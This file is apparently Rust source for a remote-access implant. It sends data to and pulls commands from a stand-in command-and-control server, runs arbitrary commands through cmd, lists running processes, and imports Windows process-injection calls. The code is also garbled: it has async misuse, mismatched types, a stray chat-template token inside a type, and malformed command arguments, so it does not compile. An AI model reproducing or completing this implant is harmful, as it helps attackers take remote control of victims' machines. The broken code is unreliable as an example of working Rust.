use std::sync::{Arc, Mutex};
use tokio::time::sleep;
use std::process::Command;
use reqwest::Client;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::thread;
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::handleapi::CloseHandle;
use std::ffi::c_void;
use std::sync::{mpsc, Arc};

lazy_static! {
    static ref CLIENT: Arc<Mutex<Client>> = Arc::new(Mutex::new(Client::new()));
}

#[derive(Debug)]
enum Error {
    IOError(std::io::Error),
    ReqwestError(reqwest::Error),
    WindowsError(i32),
}

impl std::fmt::Display for Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Error::IOError(e) => write!(f, "IOError: {}", e),
            Error::ReqwestError(e) => write!(f, "ReqwestError: {}", e),
            Error::WindowsError(e) => write!(f, "WindowsError: {}", e),
        }
    }
}

impl From<std::io::Error> for Error {
    fn from(e: std::io::Error) -> Self {
        Error::IOError(e)
    }
}

impl From<reqwest::Error> for Error {
    fn from(e: reqwest::Error) -> Self {
        Error::ReqwestError(e)
    }
}

impl From<i32> for Error {
    fn from(e: i32) -> Self {
        Error::WindowsError(e)
    }
}

async fn send_data_to_c2(agent_id: &str, data: &str) -> Result<(), Error> {
    let url = format!("https://your-c2-server.com/api/data/{}", agent_id);
    let client = CLIENT.lock().unwrap();
    match client.post(&url).body(data.to_string()).send().await {
        Ok(response) => {
            if !response.status().is_success() {
                let res_text = response.text().await.unwrap_or_else(|_| "".to_string());
                return Err(Error::from(res_text.parse::<i32>().unwrap_or(-1)));
            }
            Ok(())
        }
        Err(e) => Err(Error::from(e)),
    }
}

async fn fetch_command(agent_id: &str) -> Result<String, Error> {
    let url = format!("https://your-c2-server.com/api/command/{}", agent_id);
    let client = CLIENT.lock().unwrap();
    let response = client.get(&url).send().await?;
    let command: serde_json::Value = response.json().await?;
    let command = command["action"].as_str().unwrap_or("sleep").to_string();
    Ok(command)
}

fn spawn_task(tx: mpsc::Sender<(String, Result<(), Error>), Arc<Mutex<Client>>, String>) {
    loop {
        let (payload, command) = tx.recv().expect("Error receiving task");

        if command == "exit" {
            break;
        }

        // Send the data to the C2 server
        send_data_to_c2(&payload, &command).await.unwrap();

        // Fetch a new command from the C2 server
        let new_command = fetch_command(&payload).await.unwrap();

        tx.send((payload, new_command)).expect("Error sending task");
    }
}

#[tokio::main]
async fn main() -> Result<(), Error> {
    let (tx, rx) = mpsc::channel(16);
    let agent_id = "agent_1234";
    let payload: Vec<u8> = vec![0, 1, 2, 3, 4, 5];

    // Adding an Arc<Mutex<Client>> to pass the client to spawn_task function
    let client = Arc::new(Mutex::new(Client::new()));

    let handle = tokio::spawn(async move {
        spawn_task(tx.clone(), client.clone(), agent_id.to_string()).await;
    });

    let _ = tx.send((agent_id.to_string(), "Sample data".to_string())).unwrap();

    let mut process_list = Vec::new();

    while let Ok((payload, command)) = rx.recv().await {
        println!("Received payload: {:?}, command: {:?}", payload, command);

        if command.contains("ls") {
            let output = process::Command::new("cmd")
                .arg("/c")
                .arg("echo OFF")
                .arg("/c")
                .arg("echo %PATH%")
                .output()
                .expect("Failed to execute process");

            if !output.status.success() {
                println!("Command failed: {}", String::from_utf8_lossy(&output.stderr));
                return Ok(());
            }

            let lines = std::str::from_utf8(&output.stdout).unwrap().lines().collect::<Vec<|im_start|>>();
            for line in lines {
                println!("{:?}", line.trim());
                process_list.push(line.trim().to_owned());
            }

            let command_result = tx.send((payload, "ls".to_string())).expect("Error sending task");

            tx.send((payload, command_result)).expect("Error sending task");

            continue;
        }

        if command.contains("tasklist") {
            let output = process::Command::new("cmd")
                .arg("/c")
                .arg("wmic process where commandline like '%%exe%%' get commandline,processid")
                .output()
                .expect("Failed to execute process");

            if !output.status.success() {
                println!("Command failed: {}", String::from_utf8_lossy(&output.stderr));
                return Ok(());
            }

            let lines = std::str::from_utf8(&output.stdout).unwrap().lines().collect::<Vec<&str>>();

            for line in lines {
                let parts: Vec<&str> = line.split(' ').collect();
                if parts.len() >= 3 {
                    let pid: u32 = parts[1].parse().unwrap();
                    let cmd: String = parts[2..].join(" ");
                    process_list.push(format!("{:?} - PID: {:?}", cmd, pid));
                }
            }

            let command_result = tx.send((payload, "tasklist".to_string())).expect("Error sending task");

            tx.send((payload, command_result)).expect("Error sending task");

            continue;
        }

        // Execute the command and send the exit code to the main task
        let output = process::Command::new("cmd")
            .arg("/c")
            .arg(command)
            .output()
            .expect("Failed to execute process");

        if !output.status.success() {
            println!("Command failed: {}", String::from_utf8_lossy(&output.stderr));
            return Ok(());
        }

        let exit_code = output.status.code().unwrap();
        let command_result = tx.send((payload, exit_code)).expect("Error sending task");

        tx.send((payload, command_result)).expect("Error sending task");
    }

    Ok(())
}

